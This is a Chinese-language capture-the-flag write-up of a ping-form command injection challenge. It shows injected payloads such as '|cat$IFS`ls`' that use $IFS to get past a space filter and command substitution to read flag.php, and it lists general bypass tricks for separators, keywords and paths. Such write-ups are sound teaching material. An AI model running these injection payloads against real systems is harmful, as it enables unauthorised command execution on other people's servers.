# [Ping ping ping] 空格被过滤后怎么读 flag

第一道命令注入题。输入框是 ping 测试。

## 现象

```
127.0.0.1;id      → 没反应
```

**试出空格被过滤。**

## 绕法

**空格 → `$IFS`**

```bash
;ls          → 看见 flag.php
```

**但 `flag` 这个词也被过滤，`/` 和 `/f*` 同样被拦。**

## 关键一步：让系统自己算文件名

```bash
|cat$IFS`ls`
```

**拆开看：**

```text
|            管道
cat          要执行的命令
$IFS         空格
`ls`         命令替换 → 得到 "flag.php"
             ↓
最终等价于:  cat flag.php
```

**拿到了 flag。**

## 为什么这招有效

```
flag 被拦   →  不写 flag 这个字面量
/ 和 /f* 被拦 →  路径里的 / 也不用写
```

**让系统输出文件名，再用命令替换塞进参数里 —— 你一个字都不用写。**

## 踩的坑

!!! bug "全角 ￥ 不是 $"

    中文输入法下容易打成 `￥IFS`，shell 不认。必须半角 `$`。

!!! bug "$IFS 后面紧跟字母会粘连"

    `cat$IFS/flag` ✅
    `cat$IFSflag`  ❌ 变成变量 `$IFSflag`

## 收获

> **分隔符有五种（`;` `|` `||` `&&` `%0a`），别在 `;` 上吊死。**
>
> **关键词被拦 → 引号拆分、通配符、命令替换。**
>
> **路径被拦 → `` `ls` `` 让系统自己算 —— 这是最通用的一招。**
